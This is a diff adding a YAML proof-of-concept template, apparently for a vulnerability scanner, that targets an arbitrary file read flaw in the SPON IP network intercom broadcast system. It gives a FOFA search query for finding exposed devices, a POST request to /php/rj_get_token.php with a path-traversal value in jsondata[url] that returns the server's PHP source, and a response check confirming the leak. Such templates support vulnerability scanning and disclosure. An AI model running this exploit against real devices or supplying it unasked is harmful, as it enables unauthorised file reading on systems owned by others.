@@ -1,0 +1,19 @@
+id: poc-yaml-spon-php-rj-getjson-fileread
+info:
+  name: 世邦通信SPON IP网络对讲广播系统 rj_get_token.php 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: IP网络对讲广播系统
+  fofa: body="spon_base64.js" && body="login"
+requests:
+- method: POST
+  path: /php/rj_get_token.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: jsondata[url]=../php/rj_get_token.php
+  expression: "status_code == 200 && \ncontains(body, \"<?php\") &&\ncontains(body,\
+    \ \"$_POST\") &&\ncontains(body, \"$result\") &&\ncontains(body, \"file_get_contents(\"\
+    )\n"
+variables: {}
+transport: http
